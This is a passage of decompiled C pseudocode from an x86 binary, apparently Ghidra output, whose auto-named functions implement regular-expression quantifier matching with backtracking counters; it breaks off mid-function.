uint __thiscall FUN_0041194a(void *this,int *param_1)

{
  void *this_00;
  int iVar1;
  undefined4 uVar2;
  void *local_c;
  void *local_8;
  
  local_c = this;
  local_8 = this;
  iVar1 = FUN_004146d8(param_1[8]);
  if (*(int *)(iVar1 + 4) != *(int *)((int)this + 0x10)) {
    this_00 = *(void **)((int)this + 8);
    param_1[4] = *(int *)((int)this_00 + 4);
    uVar2 = FUN_0041458a(this_00,param_1,(char **)(param_1 + 2));
    if ((char)uVar2 != '\0') {
      *(int *)(iVar1 + 4) = *(int *)(iVar1 + 4) + 1;
      iVar1 = *(int *)((int)this + 4);
      param_1[4] = iVar1;
      return CONCAT31((int3)((uint)iVar1 >> 8),1);
    }
  }
  local_c = (void *)0x0;
  local_8 = (void *)0x0;
  FUN_0041473a((void *)param_1[8],&local_c);
  param_1[2] = (int)local_c;
  return (uint)local_c & 0xffffff00;
}



uint __thiscall FUN_004119b8(void *this,int param_1,char *param_2)

{
  char *pcVar1;
  uint in_EAX;
  undefined4 uVar2;
  uint uVar3;
  int local_8;
  
  pcVar1 = param_2;
  uVar3 = 0;
  local_8 = 0;
  if ((*(int *)((int)this + 0x10) != 0) &&
     (in_EAX = FUN_004145db(*(void **)((int)this + 8),param_1,&param_2), (char)in_EAX != '\0')) {
    local_8 = (int)pcVar1 - (int)param_2;
    if (local_8 == 0) {
      uVar2 = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2);
      return uVar2;
    }
    uVar3 = 1;
    if (1 < *(uint *)((int)this + 0x10)) {
      do {
        in_EAX = FUN_004145db(*(void **)((int)this + 8),param_1,&param_2);
        if ((char)in_EAX == '\0') break;
        uVar3 = uVar3 + 1;
      } while (uVar3 < *(uint *)((int)this + 0x10));
    }
  }
  if (uVar3 < *(uint *)((int)this + 0xc)) {
LAB_00411a47:
    uVar3 = in_EAX & 0xffffff00;
  }
  else {
    while (in_EAX = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2),
          (char)in_EAX == '\0') {
      if (*(uint *)((int)this + 0xc) == uVar3) goto LAB_00411a47;
      uVar3 = uVar3 - 1;
      param_2 = param_2 + local_8;
    }
    uVar3 = CONCAT31((int3)(in_EAX >> 8),1);
  }
  return uVar3;
}



uint __thiscall FUN_00411a50(void *this,undefined4 param_1,char *param_2)

{
  char *pcVar1;
  uint in_EAX;
  undefined4 uVar2;
  uint uVar3;
  int local_8;
  
  pcVar1 = param_2;
  uVar3 = 0;
  local_8 = 0;
  if ((*(int *)((int)this + 0x10) != 0) &&
     (in_EAX = FUN_00414615(*(void **)((int)this + 8),param_1,&param_2), (char)in_EAX != '\0')) {
    local_8 = (int)pcVar1 - (int)param_2;
    if (local_8 == 0) {
      uVar2 = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2);
      return uVar2;
    }
    uVar3 = 1;
    if (1 < *(uint *)((int)this + 0x10)) {
      do {
        in_EAX = FUN_00414615(*(void **)((int)this + 8),param_1,&param_2);
        if ((char)in_EAX == '\0') break;
        uVar3 = uVar3 + 1;
      } while (uVar3 < *(uint *)((int)this + 0x10));
    }
  }
  if (uVar3 < *(uint *)((int)this + 0xc)) {
LAB_00411ae1:
    uVar3 = in_EAX & 0xffffff00;
  }
  else {
    while (in_EAX = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2),
          (char)in_EAX == '\0') {
      if (*(uint *)((int)this + 0xc) == uVar3) goto LAB_00411ae1;
      uVar3 = uVar3 - 1;
      param_2 = param_2 + local_8;
    }
    uVar3 = CONCAT31((int3)(in_EAX >> 8),1);
  }
  return uVar3;
}



uint __thiscall FUN_00411aea(void *this,char *param_1)

{
  char *pcVar1;
  void *pvVar2;
  undefined4 uVar3;
  char *pcVar4;
  uint uVar5;
  char **ppcVar6;
  
  pcVar4 = param_1;
  param_1 = (char *)0x0;
  pcVar1 = *(char **)(pcVar4 + 8);
  ppcVar6 = (char **)(pcVar4 + 8);
  if (*(int *)((int)this + 0x10) != 0) {
    pvVar2 = *(void **)((int)this + 8);
    *(undefined4 *)(pcVar4 + 0x10) = *(undefined4 *)((int)pvVar2 + 4);
    uVar5 = FUN_004145db(pvVar2,(int)pcVar4,ppcVar6);
    if ((char)uVar5 != '\0') {
      if (*ppcVar6 == pcVar1) {
        param_1 = *(char **)((int)this + 0xc);
      }
      else {
        param_1 = (char *)0x1;
        if (1 < *(uint *)((int)this + 0x10)) {
          do {
            pvVar2 = *(void **)((int)this + 8);
            *(undefined4 *)(pcVar4 + 0x10) = *(undefined4 *)((int)pvVar2 + 4);
            uVar5 = FUN_004145db(pvVar2,(int)pcVar4,ppcVar6);
            if ((char)uVar5 == '\0') break;
            param_1 = param_1 + 1;
          } while (param_1 < *(char **)((int)this + 0x10));
        }
      }
    }
  }
  if (param_1 < *(char **)((int)this + 0xc)) {
    *ppcVar6 = pcVar1;
    uVar5 = (uint)pcVar1 & 0xffffff00;
  }
  else {
    ppcVar6 = (char **)FUN_0040c014(*(void **)(pcVar4 + 0x20),8);
    if (ppcVar6 != (char **)0x0) {
      *ppcVar6 = pcVar1;
      ppcVar6[1] = param_1;
    }
    uVar3 = *(undefined4 *)((int)this + 4);
    *(undefined4 *)(pcVar4 + 0x10) = uVar3;
    uVar5 = CONCAT31((int3)((uint)uVar3 >> 8),1);
  }
  return uVar5;
}



uint __thiscall FUN_00411b95(void *this,char *param_1)

{
  char *pcVar1;
  void *pvVar2;
  undefined4 uVar3;
  char *pcVar4;
  int iVar5;
  char **ppcVar6;
  uint uVar7;
  
  pcVar4 = param_1;
  param_1 = (char *)0x0;
  pcVar1 = *(char **)(pcVar4 + 8);
  ppcVar6 = (char **)(pcVar4 + 8);
  if (*(int *)((int)this + 0x10) != 0) {
    pvVar2 = *(void **)((int)this + 8);
    *(undefined4 *)(pcVar4 + 0x10) = *(undefined4 *)((int)pvVar2 + 4);
    iVar5 = FUN_00414615(pvVar2,pcVar4,ppcVar6);
    if ((char)iVar5 != '\0') {
      if (*ppcVar6 == pcVar1) {
        param_1 = *(char **)((int)this + 0xc);
      }
      else {
        param_1 = (char *)0x1;
        if (1 < *(uint *)((int)this + 0x10)) {
          do {
            pvVar2 = *(void **)((int)this + 8);
            *(undefined4 *)(pcVar4 + 0x10) = *(undefined4 *)((int)pvVar2 + 4);
            iVar5 = FUN_00414615(pvVar2,pcVar4,ppcVar6);
            if ((char)iVar5 == '\0') break;
            param_1 = param_1 + 1;
          } while (param_1 < *(char **)((int)this + 0x10));
        }
      }
    }
  }
  if (param_1 < *(char **)((int)this + 0xc)) {
    *ppcVar6 = pcVar1;
    uVar7 = (uint)pcVar1 & 0xffffff00;
  }
  else {
    ppcVar6 = (char **)FUN_0040c014(*(void **)(pcVar4 + 0x20),8);
    if (ppcVar6 != (char **)0x0) {
      *ppcVar6 = pcVar1;
      ppcVar6[1] = param_1;
    }
    uVar3 = *(undefined4 *)((int)this + 4);
    *(undefined4 *)(pcVar4 + 0x10) = uVar3;
    uVar7 = CONCAT31((int3)((uint)uVar3 >> 8),1);
  }
  return uVar7;
}



uint __thiscall FUN_00411c40(void *this,int param_1,char *param_2)

{
  uint uVar1;
  undefined4 uVar2;
  uint uVar3;
  char *local_8;
  
  local_8 = param_2;
  uVar3 = 0;
  uVar1 = FUN_004145db(*(void **)((int)this + 8),param_1,&local_8);
  if ((char)uVar1 == '\0') {
    if (*(int *)((int)this + 0xc) != 0) goto LAB_00411cdf;
  }
  else {
    if (local_8 == param_2) {
      uVar2 = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2);
      return uVar2;
    }
    uVar1 = *(uint *)((int)this + 0xc);
    if (uVar1 != 0) {
      param_2 = local_8;
    }
    uVar3 = (uint)(uVar1 != 0);
    if (uVar3 < uVar1) {
      do {
        uVar1 = FUN_004145db(*(void **)((int)this + 8),param_1,&param_2);
        if ((char)uVar1 == '\0') goto LAB_00411cdf;
        uVar3 = uVar3 + 1;
      } while (uVar3 < *(uint *)((int)this + 0xc));
    }
  }
  do {
    uVar1 = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2);
    if ((char)uVar1 != '\0') {
      return CONCAT31((int3)(uVar1 >> 8),1);
    }
    if (*(uint *)((int)this + 0x10) <= uVar3) break;
    uVar3 = uVar3 + 1;
    uVar1 = FUN_004145db(*(void **)((int)this + 8),param_1,&param_2);
  } while ((char)uVar1 != '\0');
LAB_00411cdf:
  return uVar1 & 0xffffff00;
}



uint __thiscall FUN_00411ce8(void *this,undefined4 param_1,char *param_2)

{
  uint uVar1;
  undefined4 uVar2;
  uint uVar3;
  char *local_8;
  
  local_8 = param_2;
  uVar3 = 0;
  uVar1 = FUN_00414615(*(void **)((int)this + 8),param_1,&local_8);
  if ((char)uVar1 == '\0') {
    if (*(int *)((int)this + 0xc) != 0) goto LAB_00411d89;
  }
  else {
    if (local_8 == param_2) {
      uVar2 = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2);
      return uVar2;
    }
    uVar1 = *(uint *)((int)this + 0xc);
    if (uVar1 != 0) {
      param_2 = local_8;
    }
    uVar3 = (uint)(uVar1 != 0);
    if (uVar3 < uVar1) {
      do {
        uVar1 = FUN_00414615(*(void **)((int)this + 8),param_1,&param_2);
        if ((char)uVar1 == '\0') goto LAB_00411d89;
        uVar3 = uVar3 + 1;
      } while (uVar3 < *(uint *)((int)this + 0xc));
    }
  }
  do {
    uVar1 = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2);
    if ((char)uVar1 != '\0') {
      return CONCAT31((int3)(uVar1 >> 8),1);
    }
    if (*(uint *)((int)this + 0x10) <= uVar3) break;
    uVar3 = uVar3 + 1;
    uVar1 = FUN_00414615(*(void **)((int)this + 8),param_1,&param_2);
  } while ((char)uVar1 != '\0');
LAB_00411d89:
  return uVar1 & 0xffffff00;
}



uint __thiscall FUN_00411d92(void *this,char *param_1)

{
  char *pcVar1;
  void *pvVar2;
  undefined4 uVar3;
  char *pcVar4;
  char *pcVar5;
  char **ppcVar6;
  uint uVar7;
  
  pcVar4 = param_1;
  param_1 = (char *)0x0;
  pcVar1 = *(char **)(pcVar4 + 8);
  pvVar2 = *(void **)((int)this + 8);
  ppcVar6 = (char **)(pcVar4 + 8);
  *(undefined4 *)(pcVar4 + 0x10) = *(undefined4 *)((int)pvVar2 + 4);
  pcVar5 = (char *)FUN_004145db(pvVar2,(int)pcVar4,ppcVar6);
  if ((char)pcVar5 == '\0') {
    if (*(int *)((int)this + 0xc) != 0) {
LAB_00411e3f:
      return (uint)pcVar5 & 0xffffff00;
    }
  }
  else if (*ppcVar6 == pcVar1) {
    param_1 = *(char **)((int)this + 0x10);
  }
  else if (*(uint *)((int)this + 0xc) == 0) {
    *ppcVar6 = pcVar1;
  }
  else {
    param_1 = (char *)0x1;
    if (1 < *(uint *)((int)this + 0xc)) {
      do {
        pvVar2 = *(void **)((int)this + 8);
        *(undefined4 *)(pcVar4 + 0x10) = *(undefined4 *)((int)pvVar2 + 4);
        uVar7 = FUN_004145db(pvVar2,(int)pcVar4,ppcVar6);
        if ((char)uVar7 == '\0') {
          *ppcVar6 = pcVar1;
          pcVar5 = pcVar1;
          goto LAB_00411e3f;
        }
        param_1 = param_1 + 1;
      } while (param_1 < *(char **)((int)this + 0xc));
    }
  }
  ppcVar6 = (char **)FUN_0040c014(*(void **)(pcVar4 + 0x20),8);
  if (ppcVar6 != (char **)0x0) {
    *ppcVar6 = pcVar1;
    ppcVar6[1] = param_1;
  }
  uVar3 = *(undefined4 *)((int)this + 4);
  *(undefined4 *)(pcVar4 + 0x10) = uVar3;
  return CONCAT31((int3)((uint)uVar3 >> 8),1);
}



uint __thiscall FUN_00411e43(void *this,char *param_1)

{
  char *pcVar1;
  void *pvVar2;
  undefined4 uVar3;
  char *pcVar4;
  char *pcVar5;
  char **ppcVar6;
  int iVar7;
  
  pcVar4 = param_1;
  param_1 = (char *)0x0;
  pcVar1 = *(char **)(pcVar4 + 8);
  pvVar2 = *(void **)((int)this + 8);
  ppcVar6 = (char **)(pcVar4 + 8);
  *(undefined4 *)(pcVar4 + 0x10) = *(undefined4 *)((int)pvVar2 + 4);
  pcVar5 = (char *)FUN_00414615(pvVar2,pcVar4,ppcVar6);
  if ((char)pcVar5 == '\0') {
    if (*(int *)((int)this + 0xc) != 0) {
LAB_00411ef0:
      return (uint)pcVar5 & 0xffffff00;
    }
  }
  else if (*ppcVar6 == pcVar1) {
    param_1 = *(char **)((int)this + 0x10);
  }
  else if (*(uint *)((int)this + 0xc) == 0) {
    *ppcVar6 = pcVar1;
  }
  else {
    param_1 = (char *)0x1;
    if (1 < *(uint *)((int)this + 0xc)) {
      do {
        pvVar2 = *(void **)((int)this + 8);
        *(undefined4 *)(pcVar4 + 0x10) = *(undefined4 *)((int)pvVar2 + 4);
        iVar7 = FUN_00414615(pvVar2,pcVar4,ppcVar6);
        if ((char)iVar7 == '\0') {
          *ppcVar6 = pcVar1;
          pcVar5 = pcVar1;
          goto LAB_00411ef0;
        }
        param_1 = param_1 + 1;
      } while (param_1 < *(char **)((int)this + 0xc));
    }
  }
  ppcVar6 = (char **)FUN_0040c014(*(void **)(pcVar4 + 0x20),8);
  if (ppcVar6 != (char **)0x0) {
    *ppcVar6 = pcVar1;
    ppcVar6[1] = param_1;
  }
  uVar3 = *(undefined4 *)((int)this + 4);
  *(undefined4 *)(pcVar4 + 0x10) = uVar3;
  return CONCAT31((int3)((uint)uVar3 >> 8),1);
}



uint __thiscall FUN_00411ef4(void *this,int param_1)

{
  void *this_00;
  undefined4 uVar1;
  int iVar2;
  uint uVar3;
  void *local_c;
  void *local_8;
  
  local_c = this;
  local_8 = this;
  iVar2 = FUN_004146d8(*(int *)(param_1 + 0x20));
  if (*(int *)(iVar2 + 4) != *(int *)((int)this + 0x10)) {
    this_00 = *(void **)((int)this + 8);
    *(undefined4 *)(param_1 + 0x10) = *(undefined4 *)((int)this_00 + 4);
    uVar3 = FUN_004145db(this_00,param_1,(char **)(param_1 + 8));
    if ((char)uVar3 != '\0') {
      *(int *)(iVar2 + 4) = *(int *)(iVar2 + 4) + 1;
      uVar1 = *(undefined4 *)((int)this + 4);
      *(undefined4 *)(param_1 + 0x10) = uVar1;
      return CONCAT31((int3)((uint)uVar1 >> 8),1);
    }
  }
  local_c = (void *)0x0;
  local_8 = (void *)0x0;
  FUN_0041473a(*(void **)(param_1 + 0x20),&local_c);
  *(void **)(param_1 + 8) = local_c;
  return (uint)local_c & 0xffffff00;
}



uint __thiscall FUN_00411f62(void *this,int param_1)

{
  void *this_00;
  undefined4 uVar1;
  int iVar2;
  int iVar3;
  void *local_c;
  void *local_8;
  
  local_c = this;
  local_8 = this;
  iVar2 = FUN_004146d8(*(int *)(param_1 + 0x20));
  if (*(int *)(iVar2 + 4) != *(int *)((int)this + 0x10)) {
    this_00 = *(void **)((int)this + 8);
    *(undefined4 *)(param_1 + 0x10) = *(undefined4 *)((int)this_00 + 4);
    iVar3 = FUN_00414615(this_00,param_1,(char **)(param_1 + 8));
    if ((char)iVar3 != '\0') {
      *(int *)(iVar2 + 4) = *(int *)(iVar2 + 4) + 1;
      uVar1 = *(undefined4 *)((int)this + 4);
      *(undefined4 *)(param_1 + 0x10) = uVar1;
      return CONCAT31((int3)((uint)uVar1 >> 8),1);
    }
  }
  local_c = (void *)0x0;
  local_8 = (void *)0x0;
  FUN_0041473a(*(void **)(param_1 + 0x20),&local_c);
  *(void **)(param_1 + 8) = local_c;
  return (uint)local_c & 0xffffff00;
}



uint __thiscall FUN_00411fd0(void *this,int param_1,char *param_2)

{
  char *pcVar1;
  uint in_EAX;
  undefined4 uVar2;
  uint uVar3;
  int local_8;
  
  pcVar1 = param_2;
  uVar3 = 0;
  local_8 = 0;
  if ((*(int *)((int)this + 0x10) != 0) &&
     (in_EAX = FUN_00414646(*(void **)((int)this + 8),param_1,&param_2), (char)in_EAX != '\0')) {
    local_8 = (int)pcVar1 - (int)param_2;
    if (local_8 == 0) {
      uVar2 = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2);
      return uVar2;
    }
    uVar3 = 1;
    if (1 < *(uint *)((int)this + 0x10)) {
      do {
        in_EAX = FUN_00414646(*(void **)((int)this + 8),param_1,&param_2);
        if ((char)in_EAX == '\0') break;
        uVar3 = uVar3 + 1;
      } while (uVar3 < *(uint *)((int)this + 0x10));
    }
  }
  if (uVar3 < *(uint *)((int)this + 0xc)) {
LAB_0041205f:
    uVar3 = in_EAX & 0xffffff00;
  }
  else {
    while (in_EAX = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2),
          (char)in_EAX == '\0') {
      if (*(uint *)((int)this + 0xc) == uVar3) goto LAB_0041205f;
      uVar3 = uVar3 - 1;
      param_2 = param_2 + local_8;
    }
    uVar3 = CONCAT31((int3)(in_EAX >> 8),1);
  }
  return uVar3;
}



uint __thiscall FUN_00412068(void *this,undefined4 param_1,char *param_2)

{
  char *pcVar1;
  uint in_EAX;
  undefined4 uVar2;
  uint uVar3;
  int local_8;
  
  pcVar1 = param_2;
  uVar3 = 0;
  local_8 = 0;
  if ((*(int *)((int)this + 0x10) != 0) &&
     (in_EAX = FUN_00414695(*(void **)((int)this + 8),param_1,&param_2), (char)in_EAX != '\0')) {
    local_8 = (int)pcVar1 - (int)param_2;
    if (local_8 == 0) {
      uVar2 = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2);
      return uVar2;
    }
    uVar3 = 1;
    if (1 < *(uint *)((int)this + 0x10)) {
      do {
        in_EAX = FUN_00414695(*(void **)((int)this + 8),param_1,&param_2);
        if ((char)in_EAX == '\0') break;
        uVar3 = uVar3 + 1;
      } while (uVar3 < *(uint *)((int)this + 0x10));
    }
  }
  if (uVar3 < *(uint *)((int)this + 0xc)) {
LAB_004120f9:
    uVar3 = in_EAX & 0xffffff00;
  }
  else {
    while (in_EAX = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2),
          (char)in_EAX == '\0') {
      if (*(uint *)((int)this + 0xc) == uVar3) goto LAB_004120f9;
      uVar3 = uVar3 - 1;
      param_2 = param_2 + local_8;
    }
    uVar3 = CONCAT31((int3)(in_EAX >> 8),1);
  }
  return uVar3;
}



uint __thiscall FUN_00412102(void *this,char *param_1)

{
  char *pcVar1;
  void *pvVar2;
  char *pcVar3;
  undefined4 uVar4;
  char **ppcVar5;
  uint uVar6;
  
  pcVar3 = param_1;
  param_1 = (char *)0x0;
  pcVar1 = *(char **)(pcVar3 + 8);
  ppcVar5 = (char **)(pcVar3 + 8);
  if (*(int *)((int)this + 0x10) != 0) {
    pvVar2 = *(void **)((int)this + 8);
    *(undefined4 *)(pcVar3 + 0x10) = *(undefined4 *)((int)pvVar2 + 4);
    uVar4 = FUN_00414646(pvVar2,(int)pcVar3,ppcVar5);
    if ((char)uVar4 != '\0') {
      if (*ppcVar5 == pcVar1) {
        param_1 = *(char **)((int)this + 0xc);
      }
      else {
        param_1 = (char *)0x1;
        if (1 < *(uint *)((int)this + 0x10)) {
          do {
            pvVar2 = *(void **)((int)this + 8);
            *(undefined4 *)(pcVar3 + 0x10) = *(undefined4 *)((int)pvVar2 + 4);
            uVar4 = FUN_00414646(pvVar2,(int)pcVar3,ppcVar5);
            if ((char)uVar4 == '\0') break;
            param_1 = param_1 + 1;
          } while (param_1 < *(char **)((int)this + 0x10));
        }
      }
    }
  }
  if (param_1 < *(char **)((int)this + 0xc)) {
    *ppcVar5 = pcVar1;
    uVar6 = (uint)pcVar1 & 0xffffff00;
  }
  else {
    ppcVar5 = (char **)FUN_0040c014(*(void **)(pcVar3 + 0x20),8);
    if (ppcVar5 != (char **)0x0) {
      *ppcVar5 = pcVar1;
      ppcVar5[1] = param_1;
    }
    uVar4 = *(undefined4 *)((int)this + 4);
    *(undefined4 *)(pcVar3 + 0x10) = uVar4;
    uVar6 = CONCAT31((int3)((uint)uVar4 >> 8),1);
  }
  return uVar6;
}



uint __thiscall FUN_004121ad(void *this,char *param_1)

{
  char *pcVar1;
  void *pvVar2;
  char *pcVar3;
  undefined4 uVar4;
  char **ppcVar5;
  uint uVar6;
  
  pcVar3 = param_1;
  param_1 = (char *)0x0;
  pcVar1 = *(char **)(pcVar3 + 8);
  ppcVar5 = (char **)(pcVar3 + 8);
  if (*(int *)((int)this + 0x10) != 0) {
    pvVar2 = *(void **)((int)this + 8);
    *(undefined4 *)(pcVar3 + 0x10) = *(undefined4 *)((int)pvVar2 + 4);
    uVar4 = FUN_00414695(pvVar2,pcVar3,ppcVar5);
    if ((char)uVar4 != '\0') {
      if (*ppcVar5 == pcVar1) {
        param_1 = *(char **)((int)this + 0xc);
      }
      else {
        param_1 = (char *)0x1;
        if (1 < *(uint *)((int)this + 0x10)) {
          do {
            pvVar2 = *(void **)((int)this + 8);
            *(undefined4 *)(pcVar3 + 0x10) = *(undefined4 *)((int)pvVar2 + 4);
            uVar4 = FUN_00414695(pvVar2,pcVar3,ppcVar5);
            if ((char)uVar4 == '\0') break;
            param_1 = param_1 + 1;
          } while (param_1 < *(char **)((int)this + 0x10));
        }
      }
    }
  }
  if (param_1 < *(char **)((int)this + 0xc)) {
    *ppcVar5 = pcVar1;
    uVar6 = (uint)pcVar1 & 0xffffff00;
  }
  else {
    ppcVar5 = (char **)FUN_0040c014(*(void **)(pcVar3 + 0x20),8);
    if (ppcVar5 != (char **)0x0) {
      *ppcVar5 = pcVar1;
      ppcVar5[1] = param_1;
    }
    uVar4 = *(undefined4 *)((int)this + 4);
    *(undefined4 *)(pcVar3 + 0x10) = uVar4;
    uVar6 = CONCAT31((int3)((uint)uVar4 >> 8),1);
  }
  return uVar6;
}



uint __thiscall FUN_00412258(void *this,int param_1)

{
  undefined4 uVar1;
  int iVar2;
  uint uVar3;
  void *local_c;
  void *local_8;
  
  local_c = this;
  local_8 = this;
  iVar2 = FUN_004146d8(*(int *)(param_1 + 0x20));
  if (*(int *)((int)this + 0xc) == *(int *)(iVar2 + 4)) {
    local_c = (void *)0x0;
    local_8 = (void *)0x0;
    FUN_0041473a(*(void **)(param_1 + 0x20),&local_c);
    *(void **)(param_1 + 8) = local_c;
    uVar3 = (uint)local_c & 0xffffff00;
  }
  else {
    *(int *)(iVar2 + 4) = *(int *)(iVar2 + 4) + -1;
    *(int *)(param_1 + 8) = *(int *)(param_1 + 8) - *(int *)(*(int *)((int)this + 8) + 0x10);
    uVar1 = *(undefined4 *)((int)this + 4);
    *(undefined4 *)(param_1 + 0x10) = uVar1;
    uVar3 = CONCAT31((int3)((uint)uVar1 >> 8),1);
  }
  return uVar3;
}



uint __thiscall FUN_004122b2(void *this,int param_1,char *param_2)

{
  uint uVar1;
  undefined4 uVar2;
  uint uVar3;
  char *local_8;
  
  local_8 = param_2;
  uVar3 = 0;
  uVar1 = FUN_00414646(*(void **)((int)this + 8),param_1,&local_8);
  if ((char)uVar1 == '\0') {
    if (*(int *)((int)this + 0xc) != 0) goto LAB_00412351;
  }
  else {
    if (local_8 == param_2) {
      uVar2 = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2);
      return uVar2;
    }
    uVar1 = *(uint *)((int)this + 0xc);
    if (uVar1 != 0) {
      param_2 = local_8;
    }
    uVar3 = (uint)(uVar1 != 0);
    if (uVar3 < uVar1) {
      do {
        uVar1 = FUN_00414646(*(void **)((int)this + 8),param_1,&param_2);
        if ((char)uVar1 == '\0') goto LAB_00412351;
        uVar3 = uVar3 + 1;
      } while (uVar3 < *(uint *)((int)this + 0xc));
    }
  }
  do {
    uVar1 = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2);
    if ((char)uVar1 != '\0') {
      return CONCAT31((int3)(uVar1 >> 8),1);
    }
    if (*(uint *)((int)this + 0x10) <= uVar3) break;
    uVar3 = uVar3 + 1;
    uVar1 = FUN_00414646(*(void **)((int)this + 8),param_1,&param_2);
  } while ((char)uVar1 != '\0');
LAB_00412351:
  return uVar1 & 0xffffff00;
}



uint __thiscall FUN_0041235a(void *this,undefined4 param_1,char *param_2)

{
  uint uVar1;
  undefined4 uVar2;
  uint uVar3;
  char *local_8;
  
  local_8 = param_2;
  uVar3 = 0;
  uVar1 = FUN_00414695(*(void **)((int)this + 8),param_1,&local_8);
  if ((char)uVar1 == '\0') {
    if (*(int *)((int)this + 0xc) != 0) goto LAB_004123fb;
  }
  else {
    if (local_8 == param_2) {
      uVar2 = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2);
      return uVar2;
    }
    uVar1 = *(uint *)((int)this + 0xc);
    if (uVar1 != 0) {
      param_2 = local_8;
    }
    uVar3 = (uint)(uVar1 != 0);
    if (uVar3 < uVar1) {
      do {
        uVar1 = FUN_00414695(*(void **)((int)this + 8),param_1,&param_2);
        if ((char)uVar1 == '\0') goto LAB_004123fb;
        uVar3 = uVar3 + 1;
      } while (uVar3 < *(uint *)((int)this + 0xc));
    }
  }
  do {
    uVar1 = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2);
    if ((char)uVar1 != '\0') {
      return CONCAT31((int3)(uVar1 >> 8),1);
    }
    if (*(uint *)((int)this + 0x10) <= uVar3) break;
    uVar3 = uVar3 + 1;
    uVar1 = FUN_00414695(*(void **)((int)this + 8),param_1,&param_2);
  } while ((char)uVar1 != '\0');
LAB_004123fb:
  return uVar1 & 0xffffff00;
}



uint __thiscall FUN_00412404(void *this,char *param_1)

{
  char *pcVar1;
  void *pvVar2;
  char *pcVar3;
  char *pcVar4;
  char **ppcVar5;
  undefined4 uVar6;
  
  pcVar3 = param_1;
  param_1 = (char *)0x0;
  pcVar1 = *(char **)(pcVar3 + 8);
  pvVar2 = *(void **)((int)this + 8);
  ppcVar5 = (char **)(pcVar3 + 8);
  *(undefined4 *)(pcVar3 + 0x10) = *(undefined4 *)((int)pvVar2 + 4);
  pcVar4 = (char *)FUN_00414646(pvVar2,(int)pcVar3,ppcVar5);
  if ((char)pcVar4 == '\0') {
    if (*(int *)((int)this + 0xc) != 0) {
LAB_004124b1:
      return (uint)pcVar4 & 0xffffff00;
    }
  }
  else if (*ppcVar5 == pcVar1) {
    param_1 = *(char **)((int)this + 0x10);
  }
  else if (*(uint *)((int)this + 0xc) == 0) {
    *ppcVar5 = pcVar1;
  }
  else {
    param_1 = (char *)0x1;
    if (1 < *(uint *)((int)this + 0xc)) {
      do {
        pvVar2 = *(void **)((int)this + 8);
        *(undefined4 *)(pcVar3 + 0x10) = *(undefined4 *)((int)pvVar2 + 4);
        uVar6 = FUN_00414646(pvVar2,(int)pcVar3,ppcVar5);
        if ((char)uVar6 == '\0') {
          *ppcVar5 = pcVar1;
          pcVar4 = pcVar1;
          goto LAB_004124b1;
        }
        param_1 = param_1 + 1;
      } while (param_1 < *(char **)((int)this + 0xc));
    }
  }
  ppcVar5 = (char **)FUN_0040c014(*(void **)(pcVar3 + 0x20),8);
  if (ppcVar5 != (char **)0x0) {
    *ppcVar5 = pcVar1;
    ppcVar5[1] = param_1;
  }
  uVar6 = *(undefined4 *)((int)this + 4);
  *(undefined4 *)(pcVar3 + 0x10) = uVar6;
  return CONCAT31((int3)((uint)uVar6 >> 8),1);
}



uint __thiscall FUN_004124b5(void *this,char *param_1)

{
  char *pcVar1;
  void *pvVar2;
  char *pcVar3;
  char *pcVar4;
  char **ppcVar5;
  undefined4 uVar6;
  
  pcVar3 = param_1;
  param_1 = (char *)0x0;
  pcVar1 = *(char **)(pcVar3 + 8);
  pvVar2 = *(void **)((int)this + 8);
  ppcVar5 = (char **)(pcVar3 + 8);
  *(undefined4 *)(pcVar3 + 0x10) = *(undefined4 *)((int)pvVar2 + 4);
  pcVar4 = (char *)FUN_00414695(pvVar2,pcVar3,ppcVar5);
  if ((char)pcVar4 == '\0') {
    if (*(int *)((int)this + 0xc) != 0) {
LAB_00412562:
      return (uint)pcVar4 & 0xffffff00;
    }
  }
  else if (*ppcVar5 == pcVar1) {
    param_1 = *(char **)((int)this + 0x10);
  }
  else if (*(uint *)((int)this + 0xc) == 0) {
    *ppcVar5 = pcVar1;
  }
  else {
    param_1 = (char *)0x1;
    if (1 < *(uint *)((int)this + 0xc)) {
      do {
        pvVar2 = *(void **)((int)this + 8);
        *(undefined4 *)(pcVar3 + 0x10) = *(undefined4 *)((int)pvVar2 + 4);
        uVar6 = FUN_00414695(pvVar2,pcVar3,ppcVar5);
        if ((char)uVar6 == '\0') {
          *ppcVar5 = pcVar1;
          pcVar4 = pcVar1;
          goto LAB_00412562;
        }
        param_1 = param_1 + 1;
      } while (param_1 < *(char **)((int)this + 0xc));
    }
  }
  ppcVar5 = (char **)FUN_0040c014(*(void **)(pcVar3 + 0x20),8);
  if (ppcVar5 != (char **)0x0) {
    *ppcVar5 = pcVar1;
    ppcVar5[1] = param_1;
  }
  uVar6 = *(undefined4 *)((int)this + 4);
  *(undefined4 *)(pcVar3 + 0x10) = uVar6;
  return CONCAT31((int3)((uint)uVar6 >> 8),1);
}



uint __thiscall FUN_00412566(void *this,int param_1)

{
  void *this_00;
  int iVar1;
  undefined4 uVar2;
  void *local_c;
  void *local_8;
  
  local_c = this;
  local_8 = this;
  iVar1 = FUN_004146d8(*(int *)(param_1 + 0x20));
  if (*(int *)(iVar1 + 4) != *(int *)((int)this + 0x10)) {
    this_00 = *(void **)((int)this + 8);
    *(undefined4 *)(param_1 + 0x10) = *(undefined4 *)((int)this_00 + 4);
    uVar2 = FUN_00414646(this_00,param_1,(char **)(param_1 + 8));
    if ((char)uVar2 != '\0') {
      *(int *)(iVar1 + 4) = *(int *)(iVar1 + 4) + 1;
      uVar2 = *(undefined4 *)((int)this + 4);
      *(undefined4 *)(param_1 + 0x10) = uVar2;
      return CONCAT31((int3)((uint)uVar2 >> 8),1);
    }
  }
  local_c = (void *)0x0;
  local_8 = (void *)0x0;
